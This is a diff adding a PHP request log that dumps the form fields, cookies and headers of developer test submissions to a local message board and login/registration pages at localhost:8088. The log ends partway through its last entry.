+        (
+            [date] => 
+            [message] => "
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 119
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 17
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=119
+        )
+
+)
+
+1540822902
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [date] => 
+            [message] => ><
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 121
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 20
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=121
+        )
+
+)
+
+1540822905
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [date] => 
+            [message] => dwwwdwdw
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 123
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 22
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=123
+        )
+
+)
+
+1541121972
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => 6fwu
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 31
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=31
+        )
+
+)
+
+1541121986
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => z3i7
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 33
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=33
+        )
+
+)
+
+1541122522
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => 
+            [repasswd] => 
+            [authcode] => 
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 39
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 44
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/zc.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=39
+        )
+
+)
+
+1541122527
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => 
+            [repasswd] => 
+            [authcode] => 
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 41
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 44
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/zc.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=41
+        )
+
+)
+
+1541122544
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [repasswd] => adminp@ssw0rd
+            [authcode] => 75di
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 43
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 78
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/zc.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=43
+        )
+
+)
+
+1541122556
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => 9fi4
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 45
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=45
+        )
+
+)
+
+1541122570
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => 7vuu
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 47
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=47
+        )
+
+)
+
+1541122589
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => jo5d
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 49
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=49
+        )
+
+)
+
+1541122623
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => admin
+            [repasswd] => admin
+            [authcode] => rege
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 54
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 58
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/zc.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=54
+        )
+
+)
+
+1541122672
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => admin
+            [authcode] => 5nqw
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 56
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 43
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=56
+        )
+
+)
+
+1541122839
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => admin
+            [authcode] => n5dx
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 58
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 43
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=58
+        )
+
+)
+
+1541122851
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => admin
+            [authcode] => rxk2
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 60
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 43
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=60
+        )
+
+)
+
+1541123058
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => admin
+            [authcode] => p5ps
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 62
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 43
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=62
+        )
+
+)
+
+1541123219
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => admin
+            [authcode] => mpzw
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 64
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 43
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=64
+        )
+
+)
+
+1541123326
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => wew
+            [password] => dasds
+            [authcode] => cyyi
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 66
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 41
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=66
+        )
+
+)
+
+1541123389
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123
+            [password] => 123
+            [authcode] => 
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 68
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 35
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=68
+        )
+
+)
+
+1541123404
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123
+            [password] => 123
+            [authcode] => 
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 70
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 35
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=70
+        )
+
+)
+
+1541123418
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123
+            [password] => 123
+            [authcode] => 
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 73
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 35
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=73
+        )
+
+)
+
+1541123474
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123
+            [password] => 123
+            [authcode] => 
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 76
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 35
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=76
+        )
+
+)
+
+1541124026
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123
+            [password] => 123
+            [authcode] => 
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 79
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 35
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=79
+        )
+
+)
+
+1541124040
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123
+            [password] => 123
+            [authcode] => 
+        )
+
+    [Cookie] => Array
+        (
